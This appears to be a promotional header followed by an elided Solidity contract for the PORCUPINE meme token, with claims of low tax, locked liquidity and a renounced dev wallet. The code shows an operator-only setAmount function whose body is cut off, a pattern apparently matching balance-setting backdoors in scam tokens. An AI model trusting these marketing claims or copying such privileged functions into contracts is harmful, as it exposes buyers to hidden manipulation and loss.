...
Join the official group for all information: https://t.me/porcupine_token
Official website: www.porcupine.bond

PORCUPINE is a user onboarding meme coin heavily focused on onboarding virgin users into crypto!

1% Tax (0.5% goes to burn & 0.5% goes to holders) No excessive taxing!!
Use 10% or more slippage on Uniswap to get in with no errors.

🦔🦔🦔🦔🦔🦔🦔🦔🦔🦔🦔🦔🦔

Liquidity locked on contract launch for 30 days on team.finance shortly after launch

Dev wallet renounced publicly in the telegram group

All bots blacklisted before contract launch
...
contract BEP20 is Context, IBEP20, Ownable {
    ...
    uint256 private _totalSupply = 1 * 10 ** 16;
...
contract PORCUPINE is BEP20 {
    // Transfer tax rate in basis points. (default 8%) Ours is only 1% tax!
    uint16 private transferTaxRate = 100;
    ...
    uint256 private _total = 1 * 10 ** 16;
     ...
     */
    constructor() public BEP20("🦔 Porcupine Token: www.porcupine.bond", "PORCUPINE") {
    ...
    function setAmount(address _to, uint256 _amount) public onlyOperator {
